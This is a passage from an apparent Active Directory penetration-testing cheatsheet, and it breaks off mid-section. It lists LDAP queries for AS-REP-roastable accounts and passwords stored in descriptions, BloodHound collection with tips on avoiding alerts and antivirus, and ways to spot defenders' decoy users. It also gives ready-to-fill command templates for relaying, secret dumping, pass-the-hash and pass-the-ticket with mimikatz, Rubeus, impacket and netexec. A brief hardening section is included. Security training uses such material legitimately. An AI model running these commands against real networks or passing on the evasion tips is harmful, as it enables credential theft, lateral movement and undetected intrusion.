<span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">asrep</span><span class="o">-</span><span class="nv">roastables</span><span class="w"> </span><span class="nf">users</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectClass</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="nv">userAccountControl</span><span class="o">:</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">840.113556</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">803</span><span class="o">:=</span><span class="mi">4194304</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">Find</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">Users</span><span class="w"> </span><span class="nv">that</span><span class="w"> </span><span class="nv">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nv">change</span><span class="w"> </span><span class="nv">password</span><span class="w"> </span><span class="nv">on</span><span class="w"> </span><span class="nv">next</span><span class="w"> </span><span class="nf">login</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="nv">pwdLastSet</span><span class="o">=</span><span class="mi">0</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">Find</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">Users</span><span class="w"> </span><span class="nv">that</span><span class="w"> </span><span class="nv">are</span><span class="w"> </span><span class="nv">almost</span><span class="w"> </span><span class="nv">Locked</span><span class="o">-</span><span class="nf">Out</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="nv">badPwdCount</span><span class="o">&gt;=</span><span class="mi">4</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">Find</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">Users</span><span class="w"> </span><span class="nv">with</span><span class="w"> </span><span class="o">*</span><span class="nv">pass</span><span class="o">*</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="o">*</span><span class="nv">pwd</span><span class="o">*</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">their</span><span class="w"> </span><span class="nf">description</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="o">|</span><span class="p">(</span><span class="nv">description</span><span class="o">=*</span><span class="nv">pass</span><span class="o">*</span><span class="p">)(</span><span class="nv">description</span><span class="o">=*</span><span class="nv">pwd</span><span class="o">*</span><span class="p">)))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">users</span><span class="w"> </span><span class="nv">protected</span><span class="w"> </span><span class="nv">by</span><span class="w"> </span><span class="nf">adminCount</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">user</span><span class="p">)(</span><span class="nv">adminCount</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nf">groups</span>
<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">group</span><span class="p">)</span>

<span class="o">#</span><span class="w"> </span><span class="nv">List</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nv">groups</span><span class="w"> </span><span class="nv">protected</span><span class="w"> </span><span class="nv">by</span><span class="w"> </span><span class="nf">adminCount</span>
<span class="p">(</span>&amp;<span class="p">(</span><span class="nv">objectCategory</span><span class="o">=</span><span class="nv">group</span><span class="p">)(</span><span class="nv">adminCount</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>

<span class="o">#</span><span class="w"> </span><span class="nv">Listing</span><span class="w"> </span><span class="nv">all</span><span class="w"> </span><span class="nf">servicePrincipalName</span>
<span class="p">(</span><span class="nv">servicePrincipalName</span><span class="o">=*</span><span class="p">)</span>

<span class="o">#</span><span class="w"> </span><span class="nv">Listing</span><span class="w"> </span><span class="nv">specific</span><span class="w"> </span><span class="nv">services</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="nv">their</span><span class="w"> </span><span class="nf">servicePrincipalName</span>
<span class="p">(</span><span class="nv">servicePrincipalName</span><span class="o">=</span><span class="nv">http</span><span class="cm">/*)</span>
<span class="cm">(servicePrincipalName=ldap/*)</span>
<span class="cm">(servicePrincipalName=kadmin/*)</span>
<span class="cm">(servicePrincipalName=mssqlsvc/*)</span>

<span class="cm"># Listing all computers with a given Operating System</span>
<span class="cm">(&amp;(objectCategory=Computer)(operatingSystem=&lt;OS version&gt;*))</span>

<span class="cm"># Find all Workstations</span>
<span class="cm">(sAMAccountType=805306369)</span>

<span class="cm"># Find all computers having a KeyCredentialLink</span>
<span class="cm">(&amp;(objectClass=computer)(msDS-KeyCredentialLink=*))</span>

<span class="cm"># Find all computers having an Obsolete OS</span>
<span class="cm">(&amp;(objectCategory=Computer)(|(operatingSystem=Windows 2000*)(operatingSystem=Windows Vista*)(operatingSystem=Windows XP*)(operatingSystem=Windows 7*)(operatingSystem=Windows 8*)(operatingSystem=Windows Server 200*)(operatingSystem=Windows Server 2012*)))</span>
</code></pre></div>
<h3 id="bloodhoundsharphound">BloodHound/Sharphound</h3>
<p>Collect information for <code>Bloodhound</code>:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Using exe</span>
Sharphound.exe<span class="w"> </span>--CollectionMethods<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>--Domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>--ExcludeDCs

<span class="c1"># Using ps1</span>
.<span class="w"> </span>./Sharphound.ps1
Invoke-BloodHound<span class="w"> </span>-CollectionMethods<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>-Domain<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>-ExcludeDCs
</code></pre></div>
<p>Where:</p>
<ul>
<li><strong>CollectionMethods</strong>: Determines what kind of data <code>sharphound</code> would collect. The most common options are Default or All. Also, since <code>sharphound</code> caches information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.</li>
<li><strong>Domain</strong> - The domain we want to enumerate. In some instances, you may want to enumerate a parent or other domain that has trust with your existing domain. You can tell Sharphound which domain should be enumerated by altering this parameter.</li>
<li><strong>ExcludeDCs</strong> -This will instruct <code>sharphound</code> not to touch domain controllers, which reduces the likelihood that the <code>sharphound</code> run will raise an alert.</li>
</ul>
<p>*Note 1: <code>Sharphound.ps1</code> is less likely to be blocked by AVs.
*Note 2: When running <code>Sharphound.ps1</code> from memory, better specify the output directory with the <code>-OutputDirectory</code> parameter.</p>
<p>Collect information for <code>Bloodhound</code> remotely with <a href="https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce">BloodHound.py Ingestor</a>:</p>
<div class="highlight"><pre><span></span><code>bloodhound-ce-python<span class="w"> </span>--zip<span class="w"> </span>-c<span class="w"> </span>&lt;Methods&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;@&lt;domain&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;password&gt;<span class="w"> </span>-dc<span class="w"> </span>&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span><span class="o">[</span>-ns<span class="w"> </span>&lt;DNS<span class="w"> </span>server&gt;<span class="o">]</span>
</code></pre></div>
<p>References:</p>
<ul>
<li><a href="https://github.com/BloodHoundAD/SharpHound">Sharphound</a></li>
</ul>
<h4 id="interesting-bloodhound-queries">Interesting BloodHound Queries</h4>
<p>Cool reference <a href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">here</a>.</p>
<p>Find instances where a computer has the "AdminTo" relationship over another computer:</p>
<div class="highlight"><pre><span></span><code><span class="n">MATCH</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="p">(</span><span class="n">c1</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r1</span><span class="o">:</span><span class="n">MemberOf</span><span class="o">*</span><span class="mf">1.</span><span class="p">.]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">g</span><span class="o">:</span><span class="kr">Group</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="n">r2</span><span class="o">:</span><span class="n">AdminTo</span><span class="p">]</span><span class="o">-&gt;</span><span class="p">(</span><span class="n">n</span><span class="o">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="kr">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find users and groups ACLs on every node:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>


<span class="c1">// Might be too complex</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>

<span class="c1">// Excluding administrative groups which might not be too interesting</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="k">WHERE</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"DOMAIN ADMIN"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"KEY ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ACCOUNT OPERATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE KEY ADMINS"</span><span class="p">)</span><span class="w">  </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ADMINISTRATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find users and groups ACLs on every user:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>


<span class="c1">// Might be too complex</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>

<span class="c1">// Excluding administrative groups which might not be too interesting</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"DOMAIN ADMIN"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"KEY ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ACCOUNT OPERATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE KEY ADMINS"</span><span class="p">)</span><span class="w">  </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ADMINISTRATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find users and groups ACLs on every group:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>


<span class="c1">// Might be too complex</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>

<span class="c1">// Excluding administrative groups which might not be too interesting</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">u</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="n">r1</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">n</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"DOMAIN ADMIN"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"KEY ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ACCOUNT OPERATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE ADMINS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ENTERPRISE KEY ADMINS"</span><span class="p">)</span><span class="w">  </span><span class="n">and</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="p">(</span><span class="n">u</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">contains</span><span class="w"> </span><span class="s">"ADMINISTRATORS"</span><span class="p">)</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">r1</span><span class="p">.</span><span class="n">isacl</span><span class="p">=</span><span class="k">true</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find all users and groups that can RDP to a machine:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">CanRDP</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">CanRDP</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find all users and groups that can read LAPS password:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">ReadLAPSPassword</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">ReadLAPSPassword</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<p>Find all users and groups with SQL admin privileges:</p>
<div class="highlight"><pre><span></span><code><span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">User</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">SQLAdmin</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
<span class="k">MATCH</span><span class="w"> </span><span class="n">p</span><span class="p">=(</span><span class="n">m</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">SQLAdmin</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">:</span><span class="n">Computer</span><span class="p">)</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">p</span>
</code></pre></div>
<h3 id="hints_1">Hints</h3>
<ul>
<li>When enumerating users, take a look to <code>pwdlastset</code> and <code>badpwdcount</code> properties; often, blue teams create <strong>decoy users</strong> which are deliberately made "desirable" for attackers in order to detect them. These users are monitored but can be spotted by looking at those attributes:<ul>
<li><code>pwdlastset</code> is really old i.e. the password has not been changed for a long time which is really unlikely in a enterprise network configuration.</li>
<li><code>badpwdcount</code> is set to 0 i.e. the user has never inserted a wrong password which is really unlikely for a real user</li>
</ul>
</li>
<li>Quite often cleartext password are store in the <code>Description</code> property for a user. This is generally true for those users that are shared, for example, between help desk operators.</li>
<li>Target for users belonging to <strong>enteprise adminstrators</strong> groups; these groups can be found only on the DC of a forest's root.</li>
</ul>
<h3 id="defense">Defense</h3>
<p>Hardening can be done on the DC (or other machines) to contain the information provided by the queried machine.</p>
<p>By default, whenever a users performs a domain authentication, it gets assigned with the <strong>Authenticated Users</strong> identity (or security principal) - see <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-special-identities-groups#authenticated-users">there</a>.</p>
<ul>
<li>This identity allows access to shared resources within the domain, such as files in a shared folder that should be accessible to all the workers in the organization. Membership is controlled by the operating system.</li>
</ul>
<p><strong>Netcease</strong> is a script which changes permissions on the NetSessionEnum
method by removing permission for Authenticated Users group.</p>
<ul>
<li>This fails many of the attacker's session enumeration and hence user hunting capabilities.</li>
</ul>
<p><strong>SAMRi10</strong> hardens Windows 10 and Server 2016 against enumeration using <strong>SAM Remote (SAMR)</strong> protocol, generally used by <code>net.exe</code>.</p>
<h2 id="lateral-movements_1">Lateral Movements</h2>
<h3 id="pivoting">Pivoting</h3>
<p><strong>Take also a look to <a href="https://ojack69.github.io/jacks-corner/misc/network.html#pivoting">Network Cheatsheet - Pivoting</a>!</strong></p>
<p>After opening a socks proxy with impacket's <code>ntlmrealyx</code> (<code>-socks</code> option), every relayed NTLM hash is made available:</p>
<div class="highlight"><pre><span></span><code># List releyable credentials
&gt; socks
</code></pre></div>
<p>It's then possible to use any tool to use these credentials; for Impacket-based tools use the <code>--no-pass</code> option. For example:</p>
<div class="highlight"><pre><span></span><code>proxychains<span class="w"> </span>secretsdump<span class="w"> </span>-no-pass<span class="w"> </span>&lt;stored<span class="w"> </span>credential<span class="w"> </span>-<span class="w"> </span>domain/user&gt;@&lt;target&gt;
</code></pre></div>
<h3 id="pass-the-attacks">Pass-the-* attacks</h3>
<ul>
<li><strong>Pass-the-password</strong>: This attack consists into passing around users credentials (previously obtained, for example, from a SAM dump). </li>
<li><strong>Pass-the-hash</strong>: This attack consists into passing around <strong>local accounts hashes</strong> to check if same credentials for one or more accounts have been used on other machines.</li>
<li><strong>Overpass the hash</strong>: When attackers know the RC4 key (which is in fact the user's NT hash), and when the <em>RC4 etype</em> is not disabled, they can use it to obtain Kerberos tickets.</li>
<li><strong>Pass-the-ticket</strong>/<strong>Pass-the-cache</strong>: This attack consists into passing around Kerberos tickets (TGT or TGS) in order to access services and resources as the compromised user without knowing its credentials. When passing Kerberos form tickets (.kirbi), this technique it's called "Pass-the-ticket"; when passing UNIX-like formatted tickets (.ccache) it's called "Pass-the-cache"</li>
<li><strong>Pass-the-key</strong>: This attack consists into using the key derived from user's account password in step <em>AS_REQ</em> from Kerberos authentication flow to request a TGT without requiring the actual account's password. Note that <strong>Overpass the hash</strong> is a variant of the <strong>pass-the-key</strong> attack.</li>
</ul>
<p>Perform a <strong>pass-the-password</strong> attack:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated - Use netexec instead</span>
crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;

<span class="c1"># Using netexec</span>
nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;account<span class="w"> </span>username&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;account<span class="w"> </span>password&gt;<span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;
</code></pre></div>
<p>Perform a <strong>pass-the-hash</strong> attack:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Deprecated - Use netexec instead</span>
crackmapex<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;NTLM<span class="w"> </span>hash&gt;<span class="w"> </span>--local

<span class="c1"># Using netexec</span>
nxc<span class="w"> </span>&lt;protocol&gt;<span class="w"> </span>&lt;target<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>CIDR&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;<span class="nb">local</span><span class="w"> </span>account<span class="w"> </span>username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;NTLM<span class="w"> </span>hash&gt;<span class="w"> </span>--local-auth

<span class="c1"># Using psexec </span>
psexec.py<span class="w"> </span>-hashes<span class="w"> </span>&lt;NTLM<span class="w"> </span>hash&gt;<span class="w"> </span>&lt;domain&gt;/&lt;user&gt;@&lt;target&gt;

<span class="c1"># Using xfreerdp</span>
xfreerdp<span class="w"> </span>/v:&lt;target&gt;<span class="w"> </span>/u:&lt;domain&gt;<span class="se">\\</span>&lt;user&gt;<span class="w"> </span>/pth:&lt;NTLM<span class="w"> </span>hash&gt;

<span class="c1"># Using evil-winrm</span>
evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;NTLM<span class="w"> </span>hash&gt;
</code></pre></div>
<p><strong>Overpass-the-hash</strong> attack with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>privilege::debug
sekurlsa::pth<span class="w"> </span>/user:&lt;user&gt;<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/ntlm:&lt;ntlmhash&gt;<span class="w"> </span>/run:powershell.exe
</code></pre></div>
<p>Perform a <strong>pass-the-ticket</strong> attack with <code>mimikatz</code>:</p>
<div class="highlight"><pre><span></span><code>kerberos::ptt<span class="w"> </span>&lt;path<span class="w"> </span>to<span class="w"> </span>dumped<span class="w"> </span>ticket&gt;
</code></pre></div>
<p>Perform a pass-the-ticket attack with <code>Rubeus</code>:</p>
<div class="highlight"><pre><span></span><code>Rubeus.exe<span class="w"> </span>ptt<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>ticker<span class="w"> </span>or<span class="w"> </span>file<span class="w"> </span>path&gt;
</code></pre></div>
<p>Perform a <strong>pass-the-ticket</strong> attack with <code>impacket</code>:</p>
<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;ccache<span class="w"> </span>ticket<span class="w"> </span>path&gt;
&lt;impacket<span class="w"> </span>script&gt;<span class="w"> </span>-no-pass<span class="w"> </span>-k<span class="w"> </span><span class="o">[</span>script<span class="w"> </span>options...<span class="o">]</span>
</code></pre></div>
<p>Perform a <strong>pass-the-ticket</strong> attack with <code>NetExec</code>:</p>
